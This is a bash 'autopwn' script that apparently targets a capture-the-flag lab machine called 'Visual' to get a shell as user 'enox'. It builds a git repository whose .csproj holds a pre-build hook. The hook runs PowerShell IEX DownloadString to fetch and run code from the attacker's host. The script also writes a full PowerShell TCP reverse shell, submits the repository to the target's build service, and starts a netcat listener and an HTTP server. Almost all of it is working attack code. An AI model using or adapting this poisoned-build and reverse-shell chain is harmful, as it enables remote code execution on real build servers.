#!/bin/bash

# Prompt for repository name
echo -e "\e[32m" # Set color to green
figlet "Visual Autopwn"
echo - "                            -=[ by illwill ]=-"
echo -e "\e[0m"  # Reset color back to normal
echo -e "This gets you a shell as the lowlevel user 'enox' on Visual (10.10.11.234)\n"

read -p "Enter the name of the new repository: " repo_name
# Check if repo name is provided
if [[ -z "$repo_name" ]]; then
  echo "You must provide a repository name!"
  exit 1
fi

# Prompt for IP Address and Port
read -p "Enter Tun0 IP: " user_ip
read -p "Enter HTTP Port: " httpport
read -p "Enter NetCat Port: " ncport

# Validate if IP and Port are provided
if [[ -z "$user_ip" || -z "$httpport" || -z "$ncport" ]]; then
  echo "You must provide  IP Address the Port Numbers!"
  exit 1
fi

# Create a new directory for the repository and navigate into it
mkdir "$repo_name"
cd "$repo_name"

# Initialize a new Git repository
git init

# Configure user information (replace with your own information)
git config user.name "Fake Name"
git config user.email "Fake@hacker.com"

# Create application directory
mkdir "$repo_name"
cd "$repo_name"

# Create Program.cs with simplified dummy code
echo 'Console.WriteLine("Hello, World!");' > Program.cs

# Create .csproj file with the provided content
cat > "$repo_name.csproj" <<EOL
<Project Sdk="Microsoft.NET.Sdk">

  <PropertyGroup>
    <OutputType>Exe</OutputType>
    <TargetFramework>net7.0</TargetFramework>
    <ImplicitUsings>enable</ImplicitUsings>
    <Nullable>enable</Nullable>
    <RunPostBuildEvent>Always</RunPostBuildEvent>
  </PropertyGroup>
    
  <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
    <Exec Command="powershell -c &quot;IEX(New-Object System.Net.WebClient).DownloadString('http://$user_ip:$httpport/shell.ps1')&quot;" />
  </Target>

</Project>
EOL

cd ..

# Create .sln file with the provided content, with repo_name substituted in
cat > "$repo_name.sln" <<EOL
Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 17
VisualStudioVersion = 17.0.31903.59
MinimumVisualStudioVersion = 10.0.40219.1
Project("{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}") = "$repo_name", "$repo_name\\$repo_name.csproj", "{6FAB6CC9-0A6B-4F67-8880-186613A7914B}"
EndProject
Global
        GlobalSection(SolutionConfigurationPlatforms) = preSolution
                Debug|Any CPU = Debug|Any CPU
                Release|Any CPU = Release|Any CPU
        EndGlobalSection
        GlobalSection(SolutionProperties) = preSolution
                HideSolutionNode = FALSE
        EndGlobalSection
        GlobalSection(ProjectConfigurationPlatforms) = postSolution
                {6FAB6CC9-0A6B-4F67-8880-186613A7914B}.Debug|Any CPU.ActiveCfg = Debug|Any CPU
                {6FAB6CC9-0A6B-4F67-8880-186613A7914B}.Debug|Any CPU.Build.0 = Debug|Any CPU
                {6FAB6CC9-0A6B-4F67-8880-186613A7914B}.Release|Any CPU.ActiveCfg = Release|Any CPU
                {6FAB6CC9-0A6B-4F67-8880-186613A7914B}.Release|Any CPU.Build.0 = Release|Any CPU
        EndGlobalSection
EndGlobal
EOL

# Add and commit the dummy application to the Git repository
git add .
git commit -m "Initialize dummy C# console app with specified .csproj and .sln files"

# Display a success message
echo "Successfully created and initialized '$repo_name' repository with a C# console application!"

cd .git/
git --bare update-server-info
mv hooks/post-update.sample hooks/post-update

# Create shell.ps1 file with the provided content in .git
cat > shell.ps1 <<EOL
\$client = New-Object System.Net.Sockets.TCPClient("$user_ip",$ncport);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + "PS " + (pwd).Path + "> ";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()
EOL
clear

echo "[+] Repo '$repo_name' was created successfully."
echo "[+] Submitting '$repo_name' repo URL http://$user_ip:$httpport to http://10.10.11.234/submit.php"
# Perform the curl command and capture both headers and body
output=$(curl -s -i -X POST -d 'gitRepoLink=http://'"$user_ip"':'"$httpport" http://10.10.11.234/submit.php)

# Extract Location header (redirected URL)
redirected_url=$(echo "$output" | grep -oP 'Location: \K[^\r]+' | tail -n 1)

# Check the output for the success message
if [[ $output == *"[+] File copied successfully."* ]]; then
  echo "[+] Success: Repo posted successfully."
  echo "[?] Redirected URL: http://10.10.11.234$redirected_url"
else
  echo "[x] Failure: Expected message not received. Received: $output"
  exit 1
fi


# Figure out the default terminal used on this system (Tested on Kali 2023 and Ubuntu 16.04. ymmv)
declare -A terminals
terminals=( ["gnome-terminal"]="-- bash -c" ["konsole"]="-e" ["xfce4-terminal"]="-e" ["lxterminal"]="-e" ["mate-terminal"]="-- bash -c" ["xterm"]="-e" ["urxvt"]="-e" ["qterminal"]="-e")

# Commands to be executed
command1="bash -c 'nc -lvnp $ncport; exec bash'"
#command2="bash -c 'python3 -m http.server $httpport ; exec bash'"


# Attempt to open each terminal type
for term in "${!terminals[@]}"; do
    if command -v "$term" &> /dev/null; then
        # Print and open the terminal with the netcat command
        echo "[+] Opening courtesy netcat shell with: nc -lvnp $ncport"
        nohup "$term" ${terminals[$term]} "$command1" &> /dev/null &
        sleep 1
        
        echo -e "\n[!] Watch this Window for any HTTP activity
        ...be patient it takes some time for the server to compile.
        You will see a final GET request for shell.ps1
        Your shell should arrive in the netcat window shortly after :)\n
        [!] Attempting to open default webbrowser to see the build status/errors.
        If your default browser doesnt open manually go to:
        http://10.10.11.234$redirected_url
        in your browser.\n"
        xdg-open "http://10.10.11.234$redirected_url"
        echo "Starting python HTTP server with: python3 -m http.server $httpport"
        python3 -m http.server $httpport
        exit
    fi
done

# Print error if no terminal is found
echo -e "\n[x] No recognized terminal emulator is installed on this system.\nRun these commands manually in 2 other terminal windows:\nnc -lvnp $ncport\npython -m http.server $httpport"
